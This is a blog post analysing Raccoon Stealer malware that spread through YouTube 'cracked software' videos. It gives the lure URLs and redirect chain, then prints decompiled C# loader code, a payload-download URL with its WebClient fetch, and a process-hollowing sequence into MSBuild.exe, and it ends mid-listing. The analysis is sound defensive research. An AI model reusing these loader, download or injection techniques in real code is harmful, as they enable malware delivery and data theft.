<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="My latest writeup comes to us courtesy of YouTube, specifically via the plethora of videos claiming to share cracked versions of various software.
The initial steps were quite simple, I visited YouTube, searched for &amp;ldquo;cracked software&amp;rdquo;, sorted by the last hour, and voila, hundreds of videos." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://rerednawyerg.github.io/posts/malwareanalysis/raccoon_stealer_youtube/" />


    <title>
        
            Raccoons Nesting In .NET :: Reverse Engineering and Analysis  — Reverse Engineering and Analysis
        
    </title>




<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" integrity="sha512-Cv93isQdFwaKBV+Z4X8kaVBYWHST58Xb/jVOcV9aRsGSArZsgAnFIhMpDoMDcFNoUtday1hdjn0nGp3+KZyyFw==" crossorigin="anonymous" referrerpolicy="no-referrer" />



<link rel="stylesheet" href="/main.c3c192addbb4e827854001c961f2aff3ddc39ba2e41caf23ce5acf238f828933.css" integrity="sha256-w8GSrdu06CeFQAHJYfKv893Dm6LkHK8jzlrPI4&#43;CiTM=">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Raccoons Nesting In .NET">
<meta itemprop="description" content="My latest writeup comes to us courtesy of YouTube, specifically via the plethora of videos claiming to share cracked versions of various software.
The initial steps were quite simple, I visited YouTube, searched for &ldquo;cracked software&rdquo;, sorted by the last hour, and voila, hundreds of videos.">
<meta itemprop="datePublished" content="2023-03-14T14:35:27-06:00" />
<meta itemprop="dateModified" content="2023-03-14T14:35:27-06:00" />
<meta itemprop="wordCount" content="3859">



<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Raccoons Nesting In .NET"/>
<meta name="twitter:description" content="My latest writeup comes to us courtesy of YouTube, specifically via the plethora of videos claiming to share cracked versions of various software.
The initial steps were quite simple, I visited YouTube, searched for &ldquo;cracked software&rdquo;, sorted by the last hour, and voila, hundreds of videos."/>







    <meta property="article:published_time" content="2023-03-14 14:35:27 -0600 -0600" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                mithrandir</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/firstpost">About</a></li><li><a href="/posts">Malware Analysis</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        19 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://rerednawyerg.github.io/posts/malwareanalysis/raccoon_stealer_youtube/">Raccoons Nesting In .NET</a>
      </h1>

      

      

      

      <div class="post-content">
        <hr>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.css" integrity="sha256-sCl5PUOGMLfFYctzDW3MtRib0ctyUvI9Qsmq2wXOeBY=" crossorigin="anonymous" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/default-skin/default-skin.min.css" integrity="sha256-BFeI1V+Vh1Rk37wswuOYn5lsTcaU96hGaI7OUVCLjPc=" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.js" integrity="sha256-UplRCs9v4KXVJvVY+p+RSo5Q4ilAUXh7kpjyIP5odyc=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe-ui-default.min.js" integrity="sha256-PWHOlUzc96pMc8ThwRIXPn8yH4NOLu42RQ0b9SpnpFk=" crossorigin="anonymous"></script>


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="/js/pswp-init.js"></script>

<p>My latest writeup comes to us courtesy of YouTube, specifically via the plethora of videos claiming to share cracked versions of various software.</p>
<p>The initial steps were quite simple, I visited YouTube, searched for &ldquo;cracked software&rdquo;, sorted by the last hour, and voila, hundreds of videos. I chose one near the top, titled <code>&quot;elden ring crack | free download | 2022&quot;</code>.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/first_youtube_page.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/first_youtube_page.png"
            alt="first_youtube_page"
            />
    </a>
    
</figure>
<p>The video demonstrates to the viewer how to unzip the downloaded folder and run the software within by double-clicking it. Checking out the YouTube account, this was at one point an active account featuring the user&rsquo;s gameplay, but had been compromised by a threat actor.</p>
<p>As of 3/14/2023, three weeks after I initially viewed this account, the account, videos, and links are still present.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/compromised_youtube_account.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/compromised_youtube_account.png"
            alt="compromised_youtube_account"
            />
    </a>
    
</figure>
<p>Visiting the link in the video description brought me to a page on <code>telegra.ph</code>, a site which allows users to quickly create basic websites.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/telegra_ph.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/telegra_ph.png"
            alt="telegra_ph"
            />
    </a>
    
</figure>
<p>The link on the <code>telegra.ph</code> site landed on a MediaFire page where a RAR archive, <code>Pass_2023.rar</code>, could be downloaded.</p>
<p>Note: There was a another link shown in the video itself, and on visiting this URL a redirect chain is followed and a different RAR archive is served. I won&rsquo;t dig into this sample in this post, but wanted to share the IOCs.</p>
<p>Redirect Chain: <code>softwarebeginner.com/eldenringcrack</code> -&gt; <code>emanagesoftware.com/download</code> -&gt; <code>bestdogdaycaresoftware.com/1</code></p>
<p>-&gt; <code>bittab.pw/SoftwareSetupFile.rar</code></p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/mediafire.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/mediafire.png"
            alt="mediafire"
            />
    </a>
    
</figure>
<p>On providing the password &ldquo;2023&rdquo; to <code>Pass_2023.rar</code> and extracting the contents of the archive, I was presented with a file, setup.exe, and a directory containing what appeared to be random, unrelated files and folders.</p>
<p>My focus shifted to investigating the setup.exe file.</p>
<h2 id="stage-one---setupexe-aka-tankbattle">Stage One - Setup.exe aka TankBattle</h2>
<p>Originally, the file was quite large, nearly 800MB. Guessing that null bytes had been added by the threat actor to attempt to avoid AV scans, I used the <code>readpe</code> tool to find the size of the file and trimmed it down to a more manageable 958KB. This trimmed binary can be found on <a href="https://malshare.com/sample.php?action=detail&amp;hash=6e526899044545306d18de56b05f14112a20f0ab61def710c139ffba45292bbe">Malshare</a>.</p>
<p><code>setup.exe</code> is written in C# using the .NET framework, and on opening it in dnSpy, I had a few initial observations.</p>
<p>Firstly, there was no attempt at obfuscation whatsoever. Secondly, a majority of the code seemed to be benign and referencing a tank battle game, probably ripped from another legitimate project to assist avoiding detection. However, there were several sections which were obviously malicious.</p>
<p>Following the execution flow, I&rsquo;ll outline my findings starting with the constructor of the <code>Form1</code> class.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#">Form1.Seksy = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">string</span>[]
{
	<span style="color:#e6db74">&#34;54784365&#34;</span>,
	<span style="color:#e6db74">&#34;737775&#34;</span>,
	<span style="color:#e6db74">&#34;TankBattle&#34;</span>
};
</code></pre></div><p>This in of itself is not malicious, but is used later on. Execution then moves to <code>Form1.InitializeComponent()</code>, where the remainder of the malicious code is added at random into the method. Most of the method is benign, so I will share only the malicious components.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#">ResourceManager resourceManager = <span style="color:#66d9ef">new</span> ResourceManager(<span style="color:#66d9ef">typeof</span>(Form2));
<span style="color:#66d9ef">string</span> text = (<span style="color:#66d9ef">string</span>)resourceManager.GetObject(<span style="color:#e6db74">&#34;String1&#34;</span>);
text = text.Replace(<span style="color:#e6db74">&#34;~&#34;</span>, <span style="color:#e6db74">&#34;00-&#34;</span>);
<span style="color:#66d9ef">string</span>[] array = text.Split(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[]
{
	<span style="color:#e6db74">&#39;-&#39;</span>
});
<span style="color:#66d9ef">byte</span>[] array2 = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[array.Length];
<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; array.Length; i++)
{
	array2[i] = (<span style="color:#66d9ef">byte</span>)Convert.ToUInt32(array[i], <span style="color:#ae81ff">16</span>);
}

Assembly assembly = Assembly.Load(array2);
<span style="color:#66d9ef">string</span>[] seksy = Form1.Seksy;
MethodInfo methodInfo = assembly.GetExportedTypes()[<span style="color:#ae81ff">1</span>].GetMethods()[<span style="color:#ae81ff">1</span>];
MethodBase methodBase = methodInfo;
<span style="color:#66d9ef">object</span> obj = <span style="color:#ae81ff">0</span>;
<span style="color:#66d9ef">object</span>[] parameters = seksy;
methodBase.Invoke(obj, parameters);
</code></pre></div><p>The first several lines extract a PE file from a resource embedded in <code>setup.exe</code>. The resource is called <code>String1</code> and is in the format <code>4D-5A-90-~03-~~~04-~~~FF-FF-~~B8-~~~~~~~40-~~~~~~~~~~~~~80-~~~0E-1F-</code>.</p>
<p>The tildes are replaced with null bytes, and the string is transformed into a byte array by splitting on the dash characters. The array is then passed as an argument to <code>Assembly.Load()</code>.</p>
<p>Using the dnSpy debugger, I was able to see the &ldquo;methodInfo&rdquo; variable represents <code>Melvin.White.Dodge()</code>, which must be a method in the newly created assembly. This method is invoked by passing the <code>Seksy</code> array as a parameter.</p>
<p>This brings us to the end of the first stage.</p>
<h2 id="stage-two-the-first-dll">Stage Two: The First DLL</h2>
<p>The extracted PE is a .NET DLL obfuscated with SmartAssembly. After running the DLL through de4dot, which recognized the obfuscation pattern and output a clean version, I created a .NET console wrapper application so I could debug the DLL in dnSpy.</p>
<p>After checking to ensure the <code>&lt;Module&gt;</code> constructor did not perform any actions, I started investigating the Dodge() method.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/dodge_method.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/dodge_method.png"
            alt="dodge_method"
            />
    </a>
    
</figure>
<p>Starting with line 6, the Class1 constructor loads an embedded resource, performs some DES decryption, and reads the result into a global byte array. Next, <code>smethod_0(107396853)</code> is called.</p>
<p>The argument to smethod_0 is used to calculate an index value and an offset value, which are then used to grab a specific set of bytes from the byte array. These bytes are decoded into UTF-8, base64 decoded, and returned.</p>
<p>After the string <code>s</code> is created using the method described above, it is base64 decoded again in line 7, and then passed into a custom method called <code>GZip</code>. This method, as might be expected by the name, performs Gzip decompression on the string passed to it, and returns yet another .NET DLL as a byte array. Going forward, I will refer to this new DLL by its assembly name, <code>Cruiser</code>.</p>
<p>Breaking down lines 8 and 9, the Class1.smethod_0 call returns the string <code>Munoz.Himentater</code> which is passed to GetType().</p>
<p>White.smethod_2() is actually just <code>Assembly.Load()</code>, so the &ldquo;type&rdquo; variable will hold an object that represents the <code>Munoz.Himentater</code> class from Cruiser, and &ldquo;obj&rdquo; is an object of the type <code>Munoz.Himentater</code>.</p>
<p>In lines 10-17, both calls to <code>Class1.smethod_0</code> return the string <code>CausalitySource</code>. This means <code>Munoz.Himentater.CausalitySource()</code> will be called twice, once with the argument <code>54784365</code> and again with the argument <code>737775</code> &ndash; recall the three arguments to the <code>Dodge()</code> method come from the <code>Seksy</code> array mentioned previously.</p>
<p>All <code>CausalitySource</code> does is convert hex to char, so now I know <code>StringTypeInfo</code> is equal to &ldquo;TxCe&rdquo; and <code>InputBlockSize</code> is equal to &ldquo;swu&rdquo;.</p>
<p>Here is where things got a bit tricky for me. On line 18, <code>White.LowestBreakIteration(&quot;TxCe&quot;, &quot;TankBattle&quot;)</code> is called.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/lowestbreakiteration.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/lowestbreakiteration.png"
            alt="lowestbreakiteration"
            />
    </a>
    
</figure>
<p>Issue number one - the arguments to create the ResourceManager instance are the string &ldquo;TankBattle.Properties.Resources&rdquo; and the result of the method Assembly.GetEntryAssembly(), meaning it will look for a resource under an assembly named &ldquo;TankBattle&rdquo;. I will not be able to use my wrapper executable in its current state if I want to continue debugging, I&rsquo;ll have to rename it to &ldquo;TankBattle&rdquo;.</p>
<p>Issue number two - my wrapper executable does not contain the resource <code>TankBattle.Properties.Resources.TxCe</code>, I will have to copy the <code>TxCe</code> resource out of the original .NET binary and add it to my wrapper.</p>
<p><figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/TxCe_resource.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/TxCe_resource.png"
            alt="txce_resource"
            />
    </a>
    
</figure>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/tank_battle_properties.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/tank_battle_properties.png"
            alt="tank_battle_properties"
            />
    </a>
    
</figure></p>
<p>After I had adjusted my .NET wrapper accordingly, I ran into one more snag. I have not created many .NET projects, and I was having a difficult time getting the resource to be stored in the correct location, the closest I could get was <code>TankBattle.Resources.TxCe</code>. Rather than try and figure it out, I simply used the debugger to make the argument match my wrapper&rsquo;s path right before creating the ResourceManager instance.</p>
<p><figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/second_shot_dodge.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/second_shot_dodge.png"
            alt="second_shot_dodge"
            />
    </a>
    
</figure>
Now I have reached line 19 and have a variable referencing a bitmap object. This variable is passed into the <code>White.smethod_0</code> method, which loops through each pixel, converts it to a 32-bit value, and stores that value as a byte in an array. A subset of the new array is then copied to another array, which is returned.</p>
<p>Looking at lines 20-24, I determined this new array would be modified as the result of invoking <code>Munoz.Himentater.SearchResult(array, &quot;swu&quot;)</code>. In the <code>SearchResult</code> method, each byte of the array is XOR&rsquo;d with a static value, and then XOR&rsquo;d again with a value selected by rotating through the &ldquo;swu&rdquo; string, which is converted to bytes in UTF-16BE format.</p>
<p>Surprise, surprise, the result of this method is yet another .NET DLL, which is loaded using <code>Assembly.Load()</code> in line 25.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/white_smethod_2_next_stage.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/white_smethod_2_next_stage.png"
            alt="white_smethod_2_next_stage"
            />
    </a>
    
</figure></p>
<p>To wrap up stage two, one last method is called before exiting the process.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/white_smethod1.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/white_smethod1.png"
            alt="white_smethod1"
            />
    </a>
    
</figure></p>
<p>Using the debugger to step through these calls, I was able to determine the method <code>Y4.pn.OcE()</code> would be invoked in the newly created DLL. This new DLL&rsquo;s assembly name is Outimurs, which I will use to refer to it.</p>
<p>With stage two complete, let&rsquo;s move on to stage three.</p>
<h2 id="stage-three-outimursdll">Stage Three: Outimurs.dll</h2>
<p>This next stage is heavily obfuscated and was much more difficult to walk through. It contains references to a <a href="https://github.com/itvieira/HIVacSim">legitimate .NET project</a> related to HIV infection simulation models, again likely included to deter investigation and AV scans.</p>
<p>The first thing I looked at here was the <code>&lt;Module&gt;</code> constructor.</p>
<h4 id="module-constructor">Module Constructor</h4>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/module_constructor.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/module_constructor.png"
            alt="module_constructor"
            />
    </a>
    
</figure>
<p>It looks simple, but unfortunately for me, the constructor for the <code>g3</code> class ends up being a bit more complex. I will attempt to outline it as best I can.</p>
<p>First, the a byte array is created by reading the resource <code>Y6MIKia1IugDfPiy07.AJLUQDvrspoMYIU61u</code>, and this array is used to create a dictionary of 635 key-value pairs, which all appear to hold .NET metadata tokens.</p>
<p>Next, the fields of class <code>g3</code> are looped through, and each field is assigned a delegate based on the dictionary value matching the field&rsquo;s metadata token as a key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#"><span style="color:#66d9ef">foreach</span> (FieldInfo fieldInfo <span style="color:#66d9ef">in</span> typeFromHandle.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField))
{
	<span style="color:#66d9ef">int</span> metadataToken = fieldInfo.MetadataToken;
	<span style="color:#66d9ef">int</span> num25 = t49.dPf[metadataToken];
	<span style="color:#66d9ef">bool</span> flag = (num25 &amp; <span style="color:#ae81ff">1073741824</span>) &gt; <span style="color:#ae81ff">0</span>;
	num25 &amp;= <span style="color:#ae81ff">1073741823</span>;
	MethodInfo methodInfo = (MethodInfo)<span style="color:#66d9ef">typeof</span>(t49).Module.ResolveMethod(num25, typeFromHandle.GetGenericArguments(), <span style="color:#66d9ef">new</span> Type[<span style="color:#ae81ff">0</span>]);
	<span style="color:#66d9ef">if</span> (methodInfo.IsStatic)
	{
		fieldInfo.SetValue(<span style="color:#66d9ef">null</span>, Delegate.CreateDelegate(fieldInfo.FieldType, methodInfo));
	}
...
</code></pre></div><p>To illustrate, in the first line the metadataToken of the field <code>g3.Gy</code> is obtained, which is 0x040001DD. In the next line, using <code>t49.dPf</code> (the dictionary), get the value associated with key 0x040001DD and assign it to variable &ldquo;num25&rdquo;.
The value returned is 0x060003AE, which is the metadata token for <code>Y4.E4R.XOCxlz()</code>. A delegate is then created, so now, a call to <code>g3.Gy</code> will actually call <code>Y4.E4R.XOCxlz()</code>.</p>
<p>Note: This process is followed many more times throughout execution for various other classes. This made it difficult for me to know where I would be jumping to while debugging, which I&rsquo;d guess is the purpose.</p>
<p>After assigning delegates to all the fields in the <code>g3</code> class, I reached the end of the <code>&lt;Module&gt;</code> constructor.</p>
<p>Before I can determine what the call to <code>Y4.pn.OcE()</code> will do, I must first investigate the <code>pn</code> class constructor.</p>
<h4 id="pn-class-constructor">pn Class Constructor</h4>
<p>This constructor is rather more obfuscated than the last, but by walking through the steps with the debugger, I was able to gain a rough understanding. Firstly, it creates an array of Unicode characters using a hardcoded set of loops and array manipulation. I&rsquo;ve shared the entirety of the array <a href="https://pastebin.com/RW9GVuKK">here.</a></p>
<p>A few strings are extracted from specified indices of the array, and the third string below is split using the token <code>||</code>.</p>
<pre><code class="language-string" data-lang="string">zDJqayZgb

jf221efESkp

1||0||0||0||1||http://inijingo22dev.online/Tlv5quZrJBTUzqG.exe||Tlv5quZrJBTUzqG.exe||0||0||0||0||||||||||||||0||0||0||0||0||0||0||0||v4||2||13325||0||0||||||0||0||0||||0||0||0||1||
</code></pre><p>Each distinct value split from the third string is assigned to a field of the <code>pn</code> class.</p>
<p>Next, a series of methods are called to create pointers to library functions using strings extracted from the decoded data. The pointers are assigned to fields of the <code>pn</code> class as well.</p>
<pre><code class="language-strings" data-lang="strings">pn.TaF  --&gt; kernel32.ResumeThread
pn.jaE  --&gt; kernel32.Wow64SetThreadContext
pn.taL  --&gt; kernel32.SetThreadContext
pn.kap  --&gt; kernel32.Wow64GetThreadContext
pn.man  --&gt; kernel32.GetThreadContext
pn.PaP  --&gt; kernel32.VirtualAllocEx
pn.FaX  --&gt; kernel32.WriteProcessMemory
pn.Nab  --&gt; kernel32.ReadProcessMemory
pn.saA  --&gt; ntdll.ZwUnmapViewOfSection
pn.Da8  --&gt; kernel32.CreateProcessA
</code></pre><p>This brings us to the end of the <code>pn</code> constructor, now I can finally start digging into to the <code>Y4.pn.OcE()</code> method.</p>
<h4 id="y4pnoce-method">Y4.pn.OcE() Method</h4>
<p>The method is obfuscated using branching logical statements which make it large and difficult to read manually, but following it in the debugger I was able to extract the important pieces of the puzzle.</p>
<p>After jumping around multiple case statements, eventually <code>Y4.pn.zcu(&quot;http://inijingo22dev.online/Tlv5quZrJBTUzqG.exe&quot;, &quot;Tlv5quZrJBTUzqG.exe&quot;)</code> is called. This method creates a WebClient and downloads the specified file to the location <code>C:\Users\&lt;user&gt;\AppData\Local\Temp\Tlv5quZrJBTUzqG.exe</code>.</p>
<p>This newly downloaded file is identical in structure to the original Setup.exe binary. This might be a persistence mechanism, but I don&rsquo;t see any methods called to establish persistence. It is possible the functionality may be in place but not implemented properly.</p>
<p>I&rsquo;ll be honest here, the next bit I am a little confused about. The following is executed successfully:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#">ResourceManager resourceManager = <span style="color:#66d9ef">new</span> ResourceManager(<span style="color:#e6db74">&#34;jf221efESkp&#34;</span>, GetExecutingAssembly())
</code></pre></div><p>However, there is no resource with that name. Maybe dnSpy failed to extract it, but I am not sure. The <code>Outimurs.dll</code> is <a href="https://malshare.com/sample.php?action=detail&amp;hash=214bba553a2b99bedc0a5ea3095498231fe628fa2642f7af4f592b15f5faa664">here</a> if any .NET gurus want to take a look.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/resources_outimurs.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/resources_outimurs.png"
            alt="resources_outimurs"
            />
    </a>
    
</figure></p>
<p>Regardless, the contents of the resource are returned as a byte array. Next, a method loops over every byte of the array, performing the following action:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#">byte_array[num] = ( ( toInt32((byte_array[num] ^ string_array[num % array_array.length])) - toInt32(byte_array[(num + <span style="color:#ae81ff">1</span>)]) ) + <span style="color:#ae81ff">256</span> ) % <span style="color:#ae81ff">256</span>
</code></pre></div><p>It takes each byte, XORs it with a byte from the string &ldquo;zDJqayZgb&rdquo;, then subtracts the integer value of the byte one position ahead of it in the byte array, adds 256 to the result, and then performs modulus 256. The final value is converted back into a byte and replaces the original byte.</p>
<p>The loop runs while the iterator value is <code>&lt;=</code> the array length, so the first element gets operated on twice, at the beginning of the loop and at the very end. After the loop is complete, the last byte of the array is removed.</p>
<p>The end result is a byte array starting with <code>4D 5A</code> &ndash; looks like a PE header, probably the next stage of the malware.</p>
<h4 id="process-injection">Process Injection</h4>
<p>Once the byte array is created, the <code>Y4.pn.OcE()</code> method gets the current .NET common language runtime directory and prepends it to the string &ldquo;MSBuild.exe&rdquo;, creating the string <code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe</code>.</p>
<p>Note: A frozen version of MSBuild is included by default in .NET Framework 4, so a file should already exist in the location referenced by the string.</p>
<p>Next, <code>pn.RcF(&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe&quot;, byte_array)</code> is called. It is lengthy, so I&rsquo;ll list out the main points below.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#"><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Ti</span>{
	IntPtr daw
	IntPtr wa1
	<span style="color:#66d9ef">uint</span> caz
	<span style="color:#66d9ef">uint</span> ISt }
	
CreateProcessA(path_to_MSBuild,  <span style="color:#66d9ef">string</span>.Empty, IntPtr.Zero, IntPtr.Zero, <span style="color:#66d9ef">false</span>, <span style="color:#ae81ff">134217732</span>U, IntPtr.Zero, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">ref</span> xa, <span style="color:#66d9ef">ref</span> ti)
	- dwCreationFlags: <span style="color:#ae81ff">0</span>x08000004 -- CREATE_SUSPENDED and CREATE_NO_WINDOW
GetThreadContext(ti.wa1, thread_context_array)

ReadProcessMemory(ti.daw, thread_context_array[<span style="color:#ae81ff">41</span>] + <span style="color:#ae81ff">8</span>, buffer, <span style="color:#ae81ff">4</span>, <span style="color:#66d9ef">false</span>)
VirtualAllocEx(ta.daw, <span style="color:#ae81ff">0</span>x00400000, <span style="color:#ae81ff">0</span>x0001D000, <span style="color:#ae81ff">12288</span>, <span style="color:#ae81ff">64</span>)
	- Last argument, <span style="color:#ae81ff">64</span>, translates to <span style="color:#ae81ff">0</span>x40 or PAGE_EXECUTE_READWRITE
	- Argument <span style="color:#ae81ff">12288</span> translates to MEM_COMMIT &amp; MEM_RESERVE -- ensures bytes of reserved memory are zeroed <span style="color:#66d9ef">out</span>
	- Allocate memory inside of MSBuild.exe, equivalent to the size of the byte_array
WriteProcessMemory(ta.daw, <span style="color:#ae81ff">0</span>x00400000, byte_array, <span style="color:#ae81ff">0</span>x00000400, <span style="color:#66d9ef">ref</span> num4)
	- Writes the first <span style="color:#ae81ff">1024</span> bytes of byte_array <span style="color:#66d9ef">into</span> MSBuild.exe at <span style="color:#66d9ef">base</span> address <span style="color:#ae81ff">0</span>x00400000
	
BlockCopy(byte_array, <span style="color:#ae81ff">0</span>x00000400, new_array, <span style="color:#ae81ff">0</span>, new_array.Length)
	- new_array <span style="color:#66d9ef">is</span> of size <span style="color:#ae81ff">0</span>x17C00
	- Copies <span style="color:#ae81ff">0</span>x17C00 bytes <span style="color:#66d9ef">from</span> byte_array starting <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">0</span>x400
WriteProcessMemory(ti.daw, <span style="color:#ae81ff">0</span>x00401000, new_array, new_array.Length, <span style="color:#66d9ef">ref</span> num4)
	- Writes the new_array <span style="color:#66d9ef">into</span> MSBuild.exe at address <span style="color:#ae81ff">0</span>x00401000
	
BlockCopy(byte_array, <span style="color:#ae81ff">0</span>x00018000, new_array, <span style="color:#ae81ff">0</span>, new_array.Length)
	- new_array <span style="color:#66d9ef">is</span> of size <span style="color:#ae81ff">0</span>x00002A00
	- Copies <span style="color:#ae81ff">0</span>x2A00 bytes <span style="color:#66d9ef">from</span> byte_array starting <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">0</span>x00018000
WriteProcessMemory(ta.daw, <span style="color:#ae81ff">0</span>x00419000, new_array, new_array.Length, <span style="color:#66d9ef">ref</span> num4)
	- Writes the new_array <span style="color:#66d9ef">into</span> MSBuild.exe at address <span style="color:#ae81ff">0</span>x00419000
	
BlockCopy(byte_array, <span style="color:#ae81ff">0</span>x0001AA00, new_array, <span style="color:#ae81ff">0</span>, new_array.Length)
	- new_array <span style="color:#66d9ef">is</span> size <span style="color:#ae81ff">0</span>x200
